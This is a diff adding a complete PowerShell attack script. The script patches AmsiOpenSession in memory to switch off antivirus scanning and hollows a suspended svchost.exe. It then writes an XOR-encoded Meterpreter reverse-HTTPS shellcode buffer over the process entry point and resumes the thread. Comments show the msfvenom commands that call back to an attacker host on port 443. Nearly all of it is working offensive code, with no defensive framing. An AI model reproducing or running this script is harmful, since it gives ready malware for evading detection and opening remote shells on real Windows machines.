@@ -1,0 +1,293 @@
+function LookupFunc(){
+    Param ($moduleName, $methodName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetModuleHandle") {$tmp +=$_}}
+    $GetModuleHandle = $tmp[0]
+    $user32 = $GetModuleHandle.Invoke($null, $moduleName)
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp +=$_}}
+    $GetProcAddress = $tmp[0]
+    $params = @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $user32)), $methodName)
+    try {
+        return $GetProcAddress.Invoke($null,$params)
+    } catch {
+        return $GetProcAddress.Invoke($null,@($user32, $methodName))
+    }
+}
+
+function getDelegateType {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_INFORMATION
+{
+    public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_BASIC_INFORMATION
+{
+    public IntPtr ExitStatus; public IntPtr PebBaseAddress; public IntPtr AffinityMask; public IntPtr BasePriority; public UIntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId;
+}
+
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public struct STARTUPINFO
+{
+    public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
+    public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
+    public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
+    public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
+    public IntPtr hStdError;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct SECURITY_ATTRIBUTES
+{
+    public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
+}
+
+public static class Hollow
+{
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CreateProcess(
+        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
+        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
+        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
+        out PROCESS_INFORMATION lpProcessInformation);
+}
+"@
+
+$name1 = "a" + "msi" + ".dll"
+$name2 = "A" + "msi" + "OpenS" + "ession"
+[IntPtr]$funcAddr = LookupFunc $name1 $name2
+
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32],[UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) | Out-Null
+$buf = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer) | Out-Null
+
+$StartupInfo = New-Object STARTUPINFO
+$StartupInfo.dwFlags = 0x1 # StartupInfo.dwFlag
+$StartupInfo.wShowWindow = 0x0 # StartupInfo.ShowWindow
+$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
+
+# ProcessInfo Struct
+$ProcessInfo = New-Object PROCESS_INFORMATION
+
+# SECURITY_ATTRIBUTES Struct (Process & Thread)
+$SecAttr = New-Object SECURITY_ATTRIBUTES
+$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
+
+# CreateProcess --> lpCurrentDirectory
+$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
+
+# Invoke-CreateProcess -Binary C:\Windows\System32\svchost.exe -CreationFlags 0x04 -ShowWindow 0x0 -StartF 0x1
+$res = [Hollow]::CreateProcess("C:\Windows\System32\svchost.exe", $Args, [ref] $SecAttr, [ref] $SecAttr, $false, 0x04, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
+
+#Get-Process -Id $ProcessInfo.dwProcessId |ft
+<#
+            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
+            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
+            uint retLen = new uint();
+            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
+            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
+            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");
+
+            //locate EntryPoint by first disclosing PEB
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+            uint tmp = 0;
+            IntPtr hProcess = pi.hProcess;
+            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+#>
+
+$PROCESS_BASIC_INFORMATION = New-Object PROCESS_BASIC_INFORMATION
+$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
+[UInt32]$tmp = 0
+[IntPtr]$hProcess = $ProcessInfo.hProcess;
+
+$CallResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll ZwQueryInformationProcess), (getDelegateType @([IntPtr], [Int32], [PROCESS_BASIC_INFORMATION].MakeByRefType(), [UInt32], [UInt32].MakeByRefType()) ([UInt32]))).Invoke($hProcess,0,[ref]$PROCESS_BASIC_INFORMATION,$PROCESS_BASIC_INFORMATION_Size, [ref]$tmp)
+
+#$CallResult = [Hollow]::ZwQueryInformationProcess($hProcess,0,[ref]$PROCESS_BASIC_INFORMATION,$PROCESS_BASIC_INFORMATION_Size, [ref]$tmp)
+
+[IntPtr]$rImgBaseOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64() + 0x10
+
+<#
+            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
+            byte[] procAddr = new byte[0x8];
+            byte[] dataBuf = new byte[0x200];
+            IntPtr bytesRW = new IntPtr();
+            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
+            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
+            
+            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
+            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");
+
+            //fetch address of code base
+            byte[] addrBuf = new byte[IntPtr.Size];
+            IntPtr nRead = IntPtr.Zero;
+            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+            //parse PE header to locate EntryPoint
+            byte[] data = new byte[0x200];
+            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+#>
+
+$ReadSize = 8
+$BytesRead = 0
+[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ReadSize)
+
+$res = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hProcess,$rImgBaseOffset,$lpBuffer,$ReadSize,[ref]$BytesRead)
+$SponsorImageBase = ([System.Runtime.InteropServices.Marshal]::ReadInt64($($lpBuffer.ToInt64())))
+
+$epSize = 300
+[IntPtr]$epBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($epSize)
+$epRes = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ReadProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($hProcess,$SponsorImageBase,$epBuffer,$epSize,[ref]$BytesRead)
+
+#$HollowByteArray = [System.IO.File]::ReadAllBytes($Runtime.HollowPath)
+#[IntPtr]$pHollow = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HollowByteArray.Length)
+#[System.Runtime.InteropServices.Marshal]::Copy($HollowByteArray, 0, $pHollow, $HollowByteArray.Length)
+
+<#
+            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
+            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
+            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");
+
+            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
+            uint rvaOffset = e_lfanew + 0x28;
+            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");
+
+            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
+            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
+            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");
+
+            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
+            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
+            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");
+
+            //locate address of EntryPoint
+            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+            uint opthdr = e_lfanew_offset + 0x28;
+            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+#>
+
+$bValue = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64()))
+$e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64() + 0x3C))
+$opthdr = $e_lfanew + 0x28
+
+$rva = [System.Runtime.InteropServices.Marshal]::ReadInt32($($epBuffer.ToInt64() + $opthdr))
+#$rva = 20096 #-> this works. why can't i get this value in pwsh? because of buffer size!! the opthdr value of 0x110 is 272 in decimal, which exceeded the original buffer size of 200. increasing buffer size to 300 solved it!
+$epAddr = [IntPtr]($SponsorImageBase + $rva)
+
+<#
+            //sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.135.7 LPORT=443 EXITFUNC=thread -f csharp -o met64.cs
+            byte[] buf = new byte[659] {
+                0xfc, 0x48, 0x83 <insert shellcode>
+
+            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
+            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
+            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");
+
+            //overwrite data at EntryPoint with msfvenom payload
+            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+#>
+
+#sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.135.7 LPORT=443 EXITFUNC=thread -f ps1 -o met64.ps1
+#xored with 0xfa - use xorbuffer.ps1
+[Byte[]] $buf = 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8, 
+0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xab, 0xb2, 0x71, 0xa8, 0xe2, 0xac, 0xb2, 
+0x71, 0xa8, 0xda, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 
+0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb, 
+0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0xbb, 0xab, 0x71, 0xb8, 0xc6, 0xb2, 
+0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71, 
+0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xaa, 0x71, 
+0xb2, 0xe2, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2, 
+0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0x56, 0xbb, 0x3b, 
+0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf, 
+0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71, 
+0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2, 
+0xb2, 0xfb, 0x2a, 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2, 
+0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13, 
+0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93, 
+0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc, 
+0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb, 
+0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 
+0x12, 0xf6, 0xfa, 0xfa, 0xfa, 0xcb, 0xca, 0xd4, 0xcb, 0xce, 0xd4, 0xcb, 0xce, 0xd4, 0xc8, 
+0xcb, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7, 0xcb, 
+0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa, 0xfa, 
+0xfa, 0x05, 0x2f, 0x12, 0x2c, 0xfa, 0xfa, 0xfa, 0xd5, 0x9c, 0xb7, 0x8e, 0xbc, 0xcb, 0xc3, 
+0x9c, 0xa9, 0xb1, 0xc2, 0xa5, 0x8b, 0xb0, 0x8f, 0x89, 0x91, 0x93, 0xc8, 0x9f, 0xcd, 0xce, 
+0x9d, 0xac, 0x9f, 0xa3, 0xac, 0xb7, 0x91, 0xa0, 0xaa, 0xa2, 0xbe, 0xa3, 0xc3, 0xab, 0x8d, 
+0xae, 0xbf, 0xae, 0xaf, 0xbf, 0xb0, 0x93, 0x83, 0xa2, 0xca, 0xaa, 0xa5, 0xc3, 0x8c, 0x8e, 
+0xab, 0xab, 0x89, 0xc2, 0x99, 0x83, 0xa8, 0x8c, 0x97, 0x9f, 0xb3, 0xb1, 0xbf, 0xcb, 0x80, 
+0xa8, 0x96, 0x99, 0x82, 0x82, 0x91, 0xb1, 0x96, 0xbc, 0x82, 0xa2, 0xc3, 0xcc, 0xcf, 0xb9, 
+0x93, 0x97, 0x91, 0xb2, 0xbf, 0xb3, 0xb2, 0xb5, 0x90, 0xc2, 0xa0, 0xa2, 0xbe, 0x97, 0xb1, 
+0x98, 0xb5, 0xae, 0xcd, 0xa0, 0xd7, 0xbd, 0x9e, 0xc2, 0x8e, 0xa8, 0xb3, 0x8c, 0xc2, 0xb1, 
+0xb0, 0xad, 0x9d, 0xa5, 0xbd, 0x93, 0x94, 0xb2, 0x83, 0x8c, 0xcc, 0x89, 0x83, 0x8a, 0xcd, 
+0xcf, 0xbd, 0xbe, 0xa9, 0xbd, 0xad, 0xb8, 0xb4, 0x9f, 0x8c, 0xce, 0xcb, 0xbe, 0xab, 0xd7, 
+0xbe, 0x95, 0xca, 0x95, 0x91, 0xac, 0xbd, 0xaf, 0x9c, 0xcb, 0xb5, 0xca, 0x82, 0xa2, 0x88, 
+0xcd, 0xc9, 0x82, 0xb7, 0xbe, 0xbe, 0xbe, 0x9b, 0x96, 0x9b, 0x8a, 0xce, 0xb5, 0xca, 0x8b, 
+0xb4, 0x8e, 0xd7, 0xb1, 0xaa, 0x9d, 0x90, 0x97, 0xad, 0x82, 0xbe, 0xb2, 0xb0, 0x9d, 0xb8, 
+0xc8, 0xcd, 0x88, 0xb1, 0x9c, 0xa0, 0xc2, 0xa2, 0x82, 0xcb, 0x90, 0xb2, 0x8b, 0xcf, 0x83, 
+0x9b, 0x8c, 0xc3, 0x9f, 0xbf, 0xb6, 0xb1, 0xaa, 0x97, 0xbf, 0xc9, 0xfa, 0xb2, 0x73, 0x3b, 
+0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xf8, 0xd2, 0x7e, 0xfa, 
+0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 
+0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7, 0xcb, 0x33, 0xb7, 
+0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05, 0x2f, 0x7f, 0x3a, 
+0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe, 0x0a, 0xcf, 0x1a, 
+0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8, 0x11, 0x36, 0x12, 0xaf, 
+0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b, 0x3b, 0x18, 0xea, 0xb3, 
+0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 
+0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 
+0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 
+0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 
+0x48, 0x9c, 0x71, 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 
+0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f
+
+#decode xor 0xfa
+
+for($i=0; $i -lt $buf.Length ; $i++)
+{
+    $buf[$i] = $buf[$i] -bxor 0xfa
+}
+
+
+[UInt32]$BytesWritten = 0
+$CallResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [byte[]], [Int32], [UIntPtr].MakeByRefType()) ([Bool]))).Invoke($hProcess,$epAddr,$buf,$buf.Length,[ref]$BytesWritten)
+#$CallResult = [Hollow]::WriteProcessMemory($hProcess,$epAddr,$buf,$buf.Length,[ref]$BytesWritten)
+#Write-Host $CallResult
+
+<#
+            // Resume the thread to trigger our payload
+            uint rResult = ResumeThread(pInfo.hThread);
+            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
+
+            //resume suspended thread
+            ResumeThread(pi.hThread);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+#>
+[IntPtr]$hThread = $ProcessInfo.hThread;
+[UInt32]$ResResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ResumeThread), (getDelegateType @([IntPtr]) ([UInt32]))).Invoke($hThread)
+
+#Write-Host $ResResult
